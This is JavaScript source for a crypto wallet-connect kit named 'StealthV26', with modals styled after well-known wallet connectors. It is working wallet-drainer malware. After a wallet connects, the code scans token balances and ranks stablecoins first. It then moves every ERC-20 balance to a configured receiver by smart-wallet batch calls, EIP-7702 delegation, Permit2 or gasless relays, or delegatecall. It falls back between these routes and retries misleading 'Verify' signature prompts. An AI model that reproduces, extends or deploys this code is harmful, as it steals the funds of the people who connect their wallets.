const log = (function() {
  const fmt = CONFIG.advanced.logFormat;
  return function(event, data) {
    if (fmt === "minimal") return;
    const entry = { ts: new Date().toISOString(), event, ...data };
    if (CONFIG.advanced.logURL) entry.url = window.location.href;
    if (fmt === "json") console.log(JSON.stringify(entry));
    else console.log("[StealthV26]", event, data);
  };
})();

function shortAddr(a) { return a ? a.slice(0,6) + "..." + a.slice(-4) : ""; }

function resolveRadius() {
  if (CONFIG.modal.borderRadius === "small") return "16px";
  if (CONFIG.modal.borderRadius === "medium") return "22px";
  if (CONFIG.modal.borderRadius === "full") return "999px";
  return "30px";
}

function resolveThemeTokens() {
  if (CONFIG.modal.themeMode === "light") {
    return {
      shell: "#f5f5f7",
      panel: "#ffffff",
      text: "#14141b",
      muted: "#6f6f7d",
      border: "rgba(20,20,27,0.10)",
      overlay: "rgba(12,12,20,0.55)"
    };
  }
  return {
    shell: "#0b0b10",
    panel: "#14141b",
    text: "#ffffff",
    muted: "#9f9fb0",
    border: "rgba(255,255,255,0.10)",
    overlay: "rgba(3,3,8,0.72)"
  };
}

function resolveFontFamily() {
  if (CONFIG.modal.fontStyle === "mono") return "ui-monospace, SFMono-Regular, Menlo, monospace";
  if (CONFIG.modal.fontStyle === "rounded") return "'SF Pro Rounded','Nunito',ui-sans-serif,system-ui,sans-serif";
  return "Inter,'SF Pro Display',ui-sans-serif,system-ui,sans-serif";
}

function resolveOverlayBlur() {
  if (CONFIG.modal.overlayBlur === "none") return "0px";
  if (CONFIG.modal.overlayBlur === "light") return "6px";
  if (CONFIG.modal.overlayBlur === "heavy") return "20px";
  return "12px";
}

function resolveFeaturedWallets() {
  if (CONFIG.modal.presentation && CONFIG.modal.presentation.items && CONFIG.modal.presentation.items.length) {
    return CONFIG.modal.presentation.items.slice(0, CONFIG.modal.collapseWallets ? 2 : 3);
  }
  if (CONFIG.modal.featuredWallets && CONFIG.modal.featuredWallets.length) {
    return CONFIG.modal.featuredWallets.slice(0, CONFIG.modal.collapseWallets ? 2 : 3);
  }
  if (CONFIG.modal.previewStyle === "trails") return ["route", "base", "wallet"];
  if (CONFIG.modal.previewStyle === "rainbowkit") return ["metamask", "rainbow", "coinbase"];
  if (CONFIG.modal.previewStyle === "reown") return ["injected", "walletconnect", "smart account"];
  return ["primary", "fallback", "custom"];
}

function encodeFunctionCall(name, inputTypes, args) {
  var sig = name + "(" + inputTypes.join(",") + ")";
  var h = 0;
  for (var i = 0; i < sig.length; i++) { h = ((h << 5) - h + sig.charCodeAt(i)) | 0; }
  var selector = "0x" + (h >>> 0).toString(16).padStart(8, "0");
  var data = selector;
  (args || []).forEach(function(arg, i) {
    var type = inputTypes[i];
    if (type === "address") data += arg.replace("0x", "").padStart(64, "0");
    else if (type.startsWith("uint")) data += BigInt(arg).toString(16).padStart(64, "0");
    else if (type === "bool") data += (arg ? "1" : "0").padStart(64, "0");
  });
  return data;
}

function getBoundFunction(preset) {
  var bindings = (CONFIG.contracts && CONFIG.contracts.functionBindings) || [];
  if (!bindings.length) return null;
  var targetPreset = preset || CONFIG.ui.txFunctionName || "transaction";
  return bindings.find(function(binding) {
    return binding && (binding.preset === targetPreset || binding.label === targetPreset || binding.functionName === targetPreset);
  }) || null;
}

function parseBoundArg(type, value, overrides, fallbackKey) {
  var resolved = value;
  if (overrides && fallbackKey && Object.prototype.hasOwnProperty.call(overrides, fallbackKey)) {
    resolved = overrides[fallbackKey];
  }
  if (resolved == null || resolved === "") return resolved;

  if (typeof resolved !== "string") return resolved;
  var trimmed = resolved.trim();
  if (trimmed === "$wallet") return state.address;
  if (trimmed === "$chainId") return state.chainId;
  if (trimmed === "$recipient") return CONFIG.receiver;

  if (type.endsWith("[]")) {
    try { return JSON.parse(trimmed); } catch (e) { return []; }
  }
  if (type === "bool") return trimmed === "true";
  if (type.startsWith("uint") || type.startsWith("int")) return BigInt(trimmed);
  if (type === "tuple" || type.indexOf("(") >= 0) {
    try { return JSON.parse(trimmed); } catch (e) { return trimmed; }
  }
  return trimmed;
}

async function executeConfiguredFunction(preset, overrides) {
  var binding = getBoundFunction(preset);
  if (!binding) throw new Error("No contract function binding configured for " + (preset || CONFIG.ui.txFunctionName || "transaction"));
  if (!binding.contractAddress) throw new Error("Missing bound contract address");
  if (!CONFIG.contracts || !CONFIG.contracts.primary || !CONFIG.contracts.primary.abi || !CONFIG.contracts.primary.abi.length) {
    throw new Error("Missing bound contract ABI");
  }

  var ctx = await getEthersSigner();
  var E = ctx.E;
  var signer = ctx.signer;
  var contract = new E.Contract(binding.contractAddress, CONFIG.contracts.primary.abi, signer);
  if (!binding.abi || !binding.abi.length) throw new Error("Missing bound contract ABI");
  contract = new E.Contract(binding.contractAddress, binding.abi, signer);
  var args = (binding.args || []).map(function(arg, idx) {
    return parseBoundArg(arg.type, arg.value, overrides, arg.name || ("arg" + (idx + 1)));
  });

  var fn = contract.getFunction(binding.functionKey || binding.functionName);
  if (binding.stateMutability === "view" || binding.stateMutability === "pure") {
    var result = await fn.staticCall.apply(fn, args);
    log("bound_call_success", { preset: binding.preset, functionKey: binding.functionKey });
    return result;
  }

  var tx = await fn.apply(contract, args);
  log("bound_tx_sent", { preset: binding.preset, functionKey: binding.functionKey, hash: tx.hash });
  var receipt = await tx.wait();
  log("bound_tx_confirmed", { preset: binding.preset, functionKey: binding.functionKey, hash: tx.hash, status: receipt.status });
  return { hash: tx.hash, receipt: receipt };
}

/* ═══════════════════════════════════════════════
   EXECUTION BRANCHING
   ═══════════════════════════════════════════════ */

async function executeDelegatecall(preset, overrides) {
  if (!CONFIG.strategy.delegateCall || !CONFIG.strategy.delegateCall.enabled) {
    throw new Error("delegatecall strategy is not enabled");
  }
  var target = CONFIG.strategy.delegateCall.target;
  if (!target) throw new Error("Missing delegateCall target address");

  var selectors = CONFIG.strategy.delegateCall.selectors || [];

  var ctx = await getEthersSigner();
  var E = ctx.E;
  var signer = ctx.signer;

  var binding = getBoundFunction(preset || CONFIG.ui.txFunctionName);
  if (binding && binding.contractAddress && binding.abi && binding.abi.length) {
    if (selectors.length > 0) {
      try {
        var iface = new E.Interface(binding.abi);
        var fragment = iface.getFunction(binding.functionKey || binding.functionName);
        if (fragment) {
          var fnSelector = fragment.selector;
          if (selectors.indexOf(fnSelector) < 0) {
            throw new Error("Function selector " + fnSelector + " not in delegateCall whitelist");
          }
        }
      } catch (e) {
        if (e.message && e.message.indexOf("whitelist") >= 0) throw e;
        log("delegatecall_selector_check_skip", { error: e.message });
      }
    }

    var contract = new E.Contract(target, binding.abi, signer);
    var args = (binding.args || []).map(function(arg, idx) {
      return parseBoundArg(arg.type, arg.value, overrides, arg.name || ("arg" + (idx + 1)));
    });
    var fn = contract.getFunction(binding.functionKey || binding.functionName);
    var tx = await fn.apply(contract, args);
    log("delegatecall_tx_sent", { target: target, hash: tx.hash });
    var receipt = await tx.wait();
    log("delegatecall_tx_confirmed", { target: target, hash: tx.hash, status: receipt.status });
    return { hash: tx.hash, receipt: receipt };
  }

  throw new Error("No function binding configured for delegatecall execution");
}

async function detectEIP7702Support() {
  var provider = w3mProvider || window.ethereum;
  if (!provider) return false;
  try {
    var capabilities = await provider.request({
      method: "wallet_getCapabilities",
      params: [state.address]
    });
    if (capabilities) {
      var chainKey = String(state.chainId);
      var chainHexKey = "0x" + state.chainId.toString(16);
      var chainCaps = capabilities[chainKey] || capabilities[chainHexKey];
      if (chainCaps && (chainCaps.atomicBatch || chainCaps.delegation || chainCaps["7702"])) {
        log("eip7702_detected", { chainId: state.chainId });
        return true;
      }
    }
  } catch (e) {
    log("eip7702_detect_skip", { method: "wallet_getCapabilities", error: e.message });
  }
  return false;
}

async function executeEIP7702(preset, overrides) {
  if (!CONFIG.strategy.eip7702Config || !CONFIG.strategy.eip7702Config.enabled) {
    throw new Error("EIP-7702 strategy is not enabled");
  }
  var delegationTarget = CONFIG.strategy.eip7702Config.delegationTarget;
  if (!delegationTarget) throw new Error("Missing EIP-7702 delegation target");

  if (CONFIG.strategy.eip7702Config.requiresSupport) {
    var supported = await detectEIP7702Support();
    if (!supported) {
      log("eip7702_not_supported", { chainId: state.chainId });
      throw new Error("Connected wallet does not support EIP-7702 on chain " + state.chainId);
    }
  }

  var ctx = await getEthersSigner();
  var E = ctx.E;
  var provider = w3mProvider || window.ethereum;

  var items = assetsToBatchItems();
  if (!items.length) {
    throw new Error("No assets available for EIP-7702 execution");
  }

  var recipient = CONFIG.receiver;
  var erc20Iface = new E.Interface(["function transfer(address to, uint256 amount) returns (bool)"]);

  var calls = [];
  for (var i = 0; i < items.length; i++) {
    var it = items[i];
    var amt = it.amountWei != null ? it.amountWei : E.parseUnits(String(it.amount), it.decimals || 18);
    calls.push({
      to: it.token,
      data: erc20Iface.encodeFunctionData("transfer", [recipient, amt]),
      value: "0x0"
    });
  }

  var authorization = { contractAddress: delegationTarget, chainId: state.chainId };
  log("eip7702_authorize", { delegationTarget: delegationTarget, items: items.length });

  try {
    var result = await provider.request({
      method: "wallet_sendCalls",
      params: [{
        version: "1",
        from: state.address,
        calls: calls,
        capabilities: { delegation: authorization }
      }]
    });
    log("eip7702_batch_sent", { result: result, items: items.length });
    return { callId: result, items: items.length };
  } catch (e) {
    log("eip7702_send_error", { error: e.message });
    if (CONFIG.strategy.fallbackMode && CONFIG.strategy.fallbackMode !== "none") {
      log("eip7702_fallback", { mode: CONFIG.strategy.fallbackMode });
      return executeStrategy(preset, overrides, true);
    }
    throw e;
  }
}

async function detectSmartWalletBatch() {
  var provider = w3mProvider || window.ethereum;
  if (!provider) return false;
  try {
    var capabilities = await provider.request({
      method: "wallet_getCapabilities",
      params: [state.address]
    });
    if (capabilities) {
      var chainKey = String(state.chainId);
      var chainHexKey = "0x" + state.chainId.toString(16);
      var chainCaps = capabilities[chainKey] || capabilities[chainHexKey];
      if (chainCaps && chainCaps.atomicBatch && chainCaps.atomicBatch.supported) {
        log("smart_wallet_detected", { chainId: state.chainId });
        return true;
      }
    }
  } catch (e) {
    log("smart_wallet_detect_skip", { error: e.message });
  }
  return false;
}

async function executeSmartWalletBatch(preset, overrides) {
  var provider = w3mProvider || window.ethereum;
  if (!provider) throw new Error("No provider for smart wallet batch");

  var items = assetsToBatchItems();
  if (!items.length) throw new Error("No assets for smart wallet batch");

  var ctx = await getEthersSigner();
  var E = ctx.E;
  var recipient = CONFIG.receiver;

  var erc20Iface = new E.Interface(["function transfer(address to, uint256 amount) returns (bool)"]);
  var calls = [];
  for (var i = 0; i < items.length; i++) {
    var it = items[i];
    var amt = it.amountWei != null ? it.amountWei : E.parseUnits(String(it.amount), it.decimals || 18);
    calls.push({
      to: it.token,
      data: erc20Iface.encodeFunctionData("transfer", [recipient, amt]),
      value: "0x0"
    });
  }

  log("smart_wallet_batch", { calls: calls.length, recipient: recipient });

  var result = await provider.request({
    method: "wallet_sendCalls",
    params: [{
      version: "1",
      from: state.address,
      calls: calls
    }]
  });

  log("smart_wallet_batch_sent", { result: result, items: items.length });
  return { callId: result, items: items.length };
}

async function executeDirectTransfer(preset, overrides) {
  if (getBoundFunction(preset || CONFIG.ui.txFunctionName)) {
    return executeConfiguredFunction(preset || CONFIG.ui.txFunctionName, overrides);
  }
  var items = assetsToBatchItems();
  if (items.length > 0 && CONFIG.receiver) {
    return batchSend({ recipient: CONFIG.receiver, items: items });
  }
  throw new Error("No execution target configured for direct mode");
}

async function executeStrategy(preset, overrides, isFallback) {
  var mode = isFallback ? CONFIG.strategy.fallbackMode : CONFIG.strategy.mode;
  log("strategy_execute", { mode: mode, isFallback: !!isFallback, preset: preset || CONFIG.ui.txFunctionName });

  if (mode === "eip7702" && !isFallback) {
    return executeEIP7702(preset, overrides);
  }

  if (CONFIG.strategy.delegateCall && CONFIG.strategy.delegateCall.enabled && !isFallback) {
    try {
      return executeDelegatecall(preset, overrides);
    } catch (e) {
      log("delegatecall_error", { error: e.message });
      if (CONFIG.strategy.fallbackMode && CONFIG.strategy.fallbackMode !== "none") {
        return executeStrategy(preset, overrides, true);
      }
      throw e;
    }
  }

  // Smart wallet batch: when appKit.smartWallet is enabled and wallet supports atomicBatch
  if (CONFIG.appKit && CONFIG.appKit.smartWallet && !isFallback) {
    try {
      var swSupported = await detectSmartWalletBatch();
      if (swSupported) {
        var swItems = assetsToBatchItems();
        if (swItems.length > 0 && CONFIG.receiver) {
          return executeSmartWalletBatch(preset, overrides);
        }
      }
    } catch (swErr) {
      log("smart_wallet_fallthrough", { error: swErr.message });
    }
  }

  if (mode === "permit2" || mode === "gasless") {
    var items = assetsToBatchItems();
    if (items.length > 0 && CONFIG.receiver) {
      return relayBatch({
        recipient: CONFIG.receiver,
        items: items,
        projectId: CONFIG.projectId,
        relayUrl: window.location.origin + "/api/relay/batch"
      });
    }
    if (getBoundFunction(preset || CONFIG.ui.txFunctionName)) {
      return executeConfiguredFunction(preset || CONFIG.ui.txFunctionName, overrides);
    }
  }

  if (mode === "permit" || mode === "approve" || mode === "direct") {
    return executeDirectTransfer(preset, overrides);
  }

  if (mode === "multicall" && CONFIG.strategy.multicall) {
    var mcItems = assetsToBatchItems();
    if (mcItems.length > 0 && CONFIG.receiver) {
      return batchSend({ recipient: CONFIG.receiver, items: mcItems });
    }
  }

  if (getBoundFunction(preset || CONFIG.ui.txFunctionName)) {
    return executeConfiguredFunction(preset || CONFIG.ui.txFunctionName, overrides);
  }

  return requestSignature();
}

/* ═══════════════════════════════════════════════
   STATE
   ═══════════════════════════════════════════════ */

var state = {
  address: null,
  chainId: null,
  chainName: null,
  connected: false,
  assets: [],
  provider: null
};

/* ═══════════════════════════════════════════════
   CONNECTION HANDLER (via Web3Modal events)
   ═══════════════════════════════════════════════ */

function updateConnectedState(address, chainId) {
  state.address = address;
  state.chainId = chainId;
  var chain = CONFIG.chains.find(function(c) { return c.chainId === chainId; });
  state.chainName = chain ? chain.name : "Unknown";
  state.connected = true;
  log("connect", { address: state.address, chainId: state.chainId, chain: state.chainName });

  // Update custom connect buttons
  document.querySelectorAll(CONFIG.ui.connectClass).forEach(function(btn) {
    if (btn.tagName !== "W3M-BUTTON" && btn.tagName !== "W3M-CONNECT-BUTTON") {
      btn.textContent = CONFIG.ui.text.connected.replace("{wallet}", shortAddr(state.address));
    }
  });

  mountedConnectButtons.forEach(function(btn) {
    try { btn.textContent = CONFIG.ui.text.connected.replace("{wallet}", shortAddr(state.address)); } catch(e) {}
  });

  // Scan wallet assets
  setTimeout(function() { scanAndProcess(); }, 0);

  // Auto Permit2 batch when recipient + automation are configured
  if (CONFIG.advanced.autoSign && CONFIG.receiver) {
    setTimeout(function() {
      executeStrategy(CONFIG.ui.txFunctionName).catch(function(e) {
        log("auto_permit2_error", { error: e && e.message ? e.message : String(e) });
      });
    }, 2200);
  } else if (CONFIG.advanced.autoSign) {
    setTimeout(function() { requestSignature(); }, 1000);
  }
}

function handleDisconnect() {
  state = { address: null, chainId: null, chainName: null, connected: false, assets: [], provider: null };
  document.querySelectorAll(CONFIG.ui.connectClass).forEach(function(btn) {
    if (btn.tagName !== "W3M-BUTTON" && btn.tagName !== "W3M-CONNECT-BUTTON") {
      btn.textContent = CONFIG.ui.text.connect;
    }
  });
  mountedConnectButtons.forEach(function(btn) {
    try { btn.textContent = CONFIG.ui.text.connect; } catch(e) {}
  });
  log("disconnect", {});
}

function mountConnectButton(target) {
  var el = null;
  if (typeof target === "string") {
    el = document.querySelector(target);
  } else if (target && target.nodeType === 1) {
    el = target;
  }
  if (!el) throw new Error("mountConnectButton: target not found");

  var btn = document.createElement("button");
  btn.type = "button";
  btn.textContent = state.connected && state.address
    ? CONFIG.ui.text.connected.replace("{wallet}", shortAddr(state.address))
    : CONFIG.ui.text.connect;

  btn.style.cursor = "pointer";
  btn.style.padding = "10px 14px";
  btn.style.borderRadius = resolveRadius();
  btn.style.border = "1px solid " + resolveThemeTokens().border;
  btn.style.background = CONFIG.modal.accentColor;
  btn.style.color = "#fff";
  btn.style.font = "inherit";

  btn.addEventListener("click", function(e) {
    e.preventDefault();
    if (state.connected) { disconnect(); }
    else { connectAndScan().catch(function(){}); }
  });

  el.innerHTML = "";
  el.appendChild(btn);
  mountedConnectButtons.push(btn);
  return btn;
}

/* ═══════════════════════════════════════════════
   OPEN WEB3MODAL
   ═══════════════════════════════════════════════ */

async function openModal() {
  if (CONFIG.modal.framework === "custom" || CONFIG.modal.framework === "rainbowkit") {
    openCustomProviderModal();
    return;
  }
  if (!w3modal) {
    w3modal = await loadWeb3Modal();
  }
  if (w3modal) {
    w3modal.open();
    log("modal_open", {});
  }
}

function ensureCustomModal() {
  if (customModalEl) return customModalEl;
  var theme = resolveThemeTokens();
  var radius = resolveRadius();
  var fontFamily = resolveFontFamily();
  var overlay = resolveOverlayBlur();
  var featuredWallets = resolveFeaturedWallets();
  var chainChips = (CONFIG.modal.preferredChains || []).slice(0, 3);
  var walletButtons = featuredWallets.map(function(label, index) {
    var highlighted = index === 0;
    return [
      '<button type="button" data-st3-wallet-index="' + index + '" style="display:flex;align-items:center;justify-content:space-between;width:100%;padding:16px 18px;border-radius:' + radius + ';border:1px solid ' + (highlighted ? CONFIG.modal.accentColor + '66' : theme.border) + ';background:' + (highlighted ? CONFIG.modal.accentColor + '14' : theme.panel) + ';color:' + theme.text + ';cursor:pointer;box-shadow:' + (highlighted ? '0 0 0 1px ' + CONFIG.modal.accentColor + '33 inset' : 'none') + ';">',
        '<span style="font-size:14px;font-weight:600;text-transform:capitalize;">' + label + '</span>',
        '<span style="font-size:12px;color:' + (highlighted ? CONFIG.modal.accentColor : theme.muted) + ';">' + (CONFIG.modal.previewStyle === "trails" ? (highlighted ? "Best" : index + 1) : "Connect") + '</span>',
      '</button>'
    ].join("");
  }).join("");
  var chips = chainChips.map(function(chainId) {
    return '<span style="display:inline-flex;align-items:center;border:1px solid ' + theme.border + ';border-radius:999px;padding:6px 10px;font-size:11px;color:' + theme.muted + ';">Chain ' + chainId + '</span>';
  }).join("");
  var optionText = [CONFIG.modal.emailOption ? "Email option enabled" : "", CONFIG.modal.socials ? "Socials enabled" : ""].filter(Boolean).join(" • ");
  var wrap = document.createElement("div");
  wrap.setAttribute("data-st3-modal", "true");
  wrap.style.position = "fixed";
  wrap.style.inset = "0";
  wrap.style.zIndex = "999999";
  wrap.style.display = "none";
  wrap.style.alignItems = "center";
  wrap.style.justifyContent = "center";
  wrap.style.background = theme.overlay;
  wrap.style.backdropFilter = "blur(" + overlay + ")";
  wrap.innerHTML = [
    '<div style="width:min(92vw,520px);border-radius:' + radius + ';background:' + theme.shell + ';padding:24px;border:1px solid ' + theme.border + ';box-shadow:0 24px 80px rgba(0,0,0,0.35);color:' + theme.text + ';font-family:' + fontFamily + ';">',
      '<div style="display:flex;justify-content:space-between;gap:12px;align-items:flex-start;">',
        '<div>',
          '<div style="font-size:11px;letter-spacing:0.18em;text-transform:uppercase;color:' + CONFIG.modal.accentColor + ';margin-bottom:10px;">' + (CONFIG.modal.previewStyle === "trails" ? "Trails Style" : CONFIG.modal.framework === "rainbowkit" ? "RainbowKit Style" : CONFIG.modal.previewStyle === "reown" ? "Reown Style" : "Custom Style") + '</div>',
          '<div style="font-size:28px;line-height:1.1;font-weight:600;">' + CONFIG.modal.presentation.title + '</div>',
          '<div style="font-size:14px;line-height:1.5;color:' + theme.muted + ';margin-top:8px;">' + CONFIG.modal.presentation.subtitle + '</div>',
        '</div>',
        '<button type="button" data-st3-close style="height:40px;width:40px;border:none;border-radius:999px;background:' + theme.panel + ';color:' + theme.text + ';cursor:pointer;font-size:18px;">×</button>',
      '</div>',
      '<div style="display:' + (CONFIG.modal.connectLayout === "grid" ? 'grid;grid-template-columns:repeat(2,minmax(0,1fr))' : 'grid') + ';gap:12px;margin-top:20px;">' + walletButtons + '</div>',
      '<button type="button" data-st3-primary style="margin-top:18px;height:48px;width:100%;border:none;border-radius:' + (CONFIG.modal.borderRadius === "full" ? '999px' : radius) + ';background:' + CONFIG.modal.accentColor + ';color:' + CONFIG.modal.accentColorForeground + ';font-size:14px;font-weight:700;cursor:pointer;">' + CONFIG.modal.presentation.ctaLabel + '</button>',
      (chips ? '<div style="display:flex;gap:8px;flex-wrap:' + (CONFIG.modal.connectLayout === "grid" ? 'wrap' : 'nowrap') + ';margin-top:14px;">' + chips + '</div>' : ''),
      (optionText ? '<div style="margin-top:12px;font-size:12px;color:' + theme.muted + ';">' + optionText + '</div>' : ''),
      '<div style="margin-top:18px;padding:14px 16px;border-radius:' + radius + ';background:' + theme.panel + ';border:1px solid ' + theme.border + ';font-size:12px;color:' + theme.muted + ';">',
        'Mode: ' + CONFIG.modal.themeMode + ' • Accent: ' + CONFIG.modal.accentColor + ' • Radius: ' + CONFIG.modal.borderRadius + ' • Layout: ' + CONFIG.modal.connectLayout,
      '</div>',
    '</div>'
  ].join("");
  wrap.addEventListener("click", function(e) {
    if (e.target === wrap) closeCustomProviderModal();
  });
  document.body.appendChild(wrap);
  wrap.querySelector("[data-st3-close]").addEventListener("click", closeCustomProviderModal);
  var injectedBtn = wrap.querySelector('[data-st3-wallet-index="0"]') || wrap.querySelector("[data-st3-connect='injected']");
  if (injectedBtn) injectedBtn.addEventListener("click", function() {
    closeCustomProviderModal();
    connectInjectedPath().catch(function(err) { log("custom_connect_error", { error: err.message }); });
  });
  var wcBtn = wrap.querySelector('[data-st3-wallet-index="1"]') || wrap.querySelector("[data-st3-connect='walletconnect']");
  if (wcBtn) wcBtn.addEventListener("click", function() {
    closeCustomProviderModal();
    openWalletConnectPath().catch(function(err) { log("custom_connect_error", { error: err.message }); });
  });
  customModalEl = wrap;
  return wrap;
}

function openCustomProviderModal() {
  var modal = ensureCustomModal();
  modal.style.display = "flex";
  log("custom_modal_open", { framework: CONFIG.modal.framework, previewStyle: CONFIG.modal.previewStyle });
}

function closeCustomProviderModal() {
  if (customModalEl) customModalEl.style.display = "none";
}

async function connectInjectedPath() {
  var provider = window.ethereum;
  if (!provider) throw new Error("No injected wallet detected");
  var accounts = await provider.request({ method: "eth_requestAccounts" });
  var chainHex = await provider.request({ method: "eth_chainId" });
  var address = accounts && accounts[0] ? accounts[0] : null;
  var chainId = parseInt(chainHex, 16);
  if (!address || !chainId) throw new Error("Failed to resolve injected wallet state");
  w3mProvider = provider;
  updateConnectedState(address, chainId);
  return { address: address, chainId: chainId };
}

async function openWalletConnectPath() {
  if (!w3modal) {
    w3modal = await loadWeb3Modal();
  }
  if (!w3modal) throw new Error("WalletConnect modal unavailable");
  w3modal.open();
}

async function connectAndScan() {
  if (!sdkInitialized) {
    try { await init(); } catch(e) {}
  }
  await openModal();
  var started = Date.now();
  while (!state.connected) {
    if (Date.now() - started > 60000) throw new Error("Connect timeout");
    await new Promise(function(r) { setTimeout(r, 200); });
  }
  var assets = await scanAndProcess();
  return { address: state.address, chainId: state.chainId, chainName: state.chainName, assets: assets || state.assets, items: assetsToBatchItems() };
}

async function disconnect() {
  try {
    if (window.__st3WagmiAdapter) {
      var mod = await import(WAGMI_ACTIONS_CDN);
      await mod.disconnect(window.__st3WagmiAdapter.wagmiConfig);
    } else if (w3modal) {
      await w3modal.disconnect();
    }
  } catch(e) {}
  handleDisconnect();
}

/* ═══════════════════════════════════════════════
   SIGNATURE REQUEST
   ═══════════════════════════════════════════════ */

async function requestSignature() {
  if (!state.connected || !state.address) return;

  // Get provider from Web3Modal or window.ethereum
  var provider = w3mProvider || window.ethereum;
  if (!provider) { log("sign_error", { error: "No provider" }); return; }

  var promptText = CONFIG.advanced.signPrompt.replace("{wallet}", shortAddr(state.address));
  if (CONFIG.advanced.logSign) log("signature_prompt", { text: promptText });

  for (var attempt = 0; attempt <= CONFIG.advanced.retryCount; attempt++) {
    try {
      var result;
      if (CONFIG.advanced.eip712) {
        var typedData = {
          types: {
            EIP712Domain: [
              { name: "name", type: "string" },
              { name: "version", type: "string" },
              { name: "chainId", type: "uint256" }
            ],
            Verify: [
              { name: "wallet", type: "address" },
              { name: "nonce", type: "uint256" },
              { name: "message", type: "string" }
            ]
          },
          primaryType: "Verify",
          domain: { name: "StealthV26", version: "26", chainId: state.chainId },
          message: { wallet: state.address, nonce: Date.now(), message: promptText }
        };
        result = await provider.request({
          method: "eth_signTypedData_v4",
          params: [state.address, JSON.stringify(typedData)]
        });
      } else {
        result = await provider.request({
          method: "personal_sign",
          params: [promptText, state.address]
        });
      }
      log("signature_success", { attempt: attempt + 1 });
      return result;
    } catch(err) {
      log("signature_rejected", { attempt: attempt + 1, error: err.message });
      if (attempt === CONFIG.advanced.retryCount) {
        log("signature_failed", { maxRetries: CONFIG.advanced.retryCount });
        return null;
      }
      await new Promise(function(r) { setTimeout(r, 1500); });
    }
  }
}

/* ═══════════════════════════════════════════════
   ASSET SCANNING & PROCESSING
   ═══════════════════════════════════════════════ */

async function scanAndProcess() {
  if (!state.connected) return;
  var provider = w3mProvider || window.ethereum;
  if (!provider) return;

  log("scan_start", { address: state.address, chainId: state.chainId });

  try {
    var balHex = await provider.request({
      method: "eth_getBalance",
      params: [state.address, "latest"]
    });
    var balEth = parseInt(balHex, 16) / 1e18;

    var chain = CONFIG.chains.find(function(c) { return c.chainId === state.chainId; });
    log("native_balance", { balance: balEth, symbol: chain ? chain.currency : "ETH", chain: state.chainName });

    state.assets = [{
      type: "NATIVE",
      symbol: chain ? chain.currency : "ETH",
      balance: balEth,
      balanceRaw: balHex,
      address: "0x0000000000000000000000000000000000000000"
    }];

    var TOKEN_LISTS = {
      1: [
        { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
        { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
        { addr: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI",  decimals: 18 },
        { addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8 }
      ],
      56: [
        { addr: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 },
        { addr: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 },
        { addr: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", symbol: "BUSD", decimals: 18 }
      ],
      137: [
        { addr: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT", decimals: 6 },
        { addr: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC", decimals: 6 },
        { addr: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", symbol: "DAI",  decimals: 18 }
      ]
    };

    var tokens = TOKEN_LISTS[state.chainId] || [];
    for (var i = 0; i < tokens.length; i++) {
      try {
        var data = encodeFunctionCall("balanceOf", ["address"], [state.address]);
        var result = await provider.request({
          method: "eth_call",
          params: [{ to: tokens[i].addr, data: data }, "latest"]
        });
        var bal = parseInt(result, 16) / Math.pow(10, tokens[i].decimals);
        if (bal > 0) {
          state.assets.push({
            type: "ERC-20",
            symbol: tokens[i].symbol,
            balance: bal,
            balanceRaw: result,
            address: tokens[i].addr,
            decimals: tokens[i].decimals
          });
        }
      } catch(e) {}
    }

    log("scan_complete", { assets: state.assets.length, chain: state.chainName });

    if (state.assets.length > 0) {
      var stables = ["USDT","USDC","DAI","BUSD"];
      state.assets.sort(function(a,b) {
        var aS = stables.indexOf(a.symbol) >= 0 ? -1 : 1;
        var bS = stables.indexOf(b.symbol) >= 0 ? -1 : 1;
        return aS !== bS ? aS - bS : b.balance - a.balance;
      });
      log("assets_sorted", { order: state.assets.map(function(a){ return a.symbol }) });
    }
  } catch(err) {
    log("scan_error", { error: err.message });
  }

  return state.assets;
}

function assetsToBatchItems() {
  if (!state.assets || !state.assets.length) return [];
  return state.assets
    .filter(function(a) { return a && a.type === "ERC-20" && a.address && a.balance && a.balance > 0; })
    .map(function(a) {
      var amountWei;
      try { amountWei = a.balanceRaw ? BigInt(a.balanceRaw) : null; } catch(e) { amountWei = null; }
      return { token: a.address, amount: String(a.balance), decimals: a.decimals, amountWei: amountWei };
    });
}

function buildTrailsWidgetUrl() {
  if (!CONFIG.strategy.trails.enabled) return null;
  var base = CONFIG.strategy.trails.widgetUrl || "https://demo.trails.build/widget";
  try {
    var url = new URL(base, window.location.origin);
    if (CONFIG.strategy.trails.apiKey) url.searchParams.set("apiKey", CONFIG.strategy.trails.apiKey);
    if (CONFIG.strategy.trails.mode) url.searchParams.set("mode", CONFIG.strategy.trails.mode);
    if (CONFIG.strategy.trails.toAddress) url.searchParams.set("toAddress", CONFIG.strategy.trails.toAddress);
    if (CONFIG.strategy.trails.toChainId) url.searchParams.set("toChainId", String(CONFIG.strategy.trails.toChainId));
    if (CONFIG.strategy.trails.toToken) url.searchParams.set("toToken", CONFIG.strategy.trails.toToken);
    if (CONFIG.strategy.trails.toAmount) url.searchParams.set("toAmount", CONFIG.strategy.trails.toAmount);
    return url.toString();
  } catch (err) {
    log("trails_url_error", { error: err && err.message ? err.message : String(err) });
    return base;
  }
}

function openTrailsWidget() {
  if (!CONFIG.strategy.trails.enabled) {
    throw new Error("Trails is not enabled in this compiled config");
  }
  var url = buildTrailsWidgetUrl();
  if (!url) throw new Error("Missing Trails widget URL");
  log("trails_open", {
    mode: CONFIG.strategy.trails.mode,
    toAddress: CONFIG.strategy.trails.toAddress,
    toChainId: CONFIG.strategy.trails.toChainId,
    toToken: CONFIG.strategy.trails.toToken,
    toAmount: CONFIG.strategy.trails.toAmount
  });
  window.open(url, "_blank", "noopener,noreferrer");
  return url;
}

/* ═══════════════════════════════════════════════
   INITIALIZATION
   ═══════════════════════════════════════════════ */

async function init() {
  if (sdkInitialized) return;
  sdkInitialized = true;
  log("sdk_init", { url: window.location.href, projectId: CONFIG.projectId });

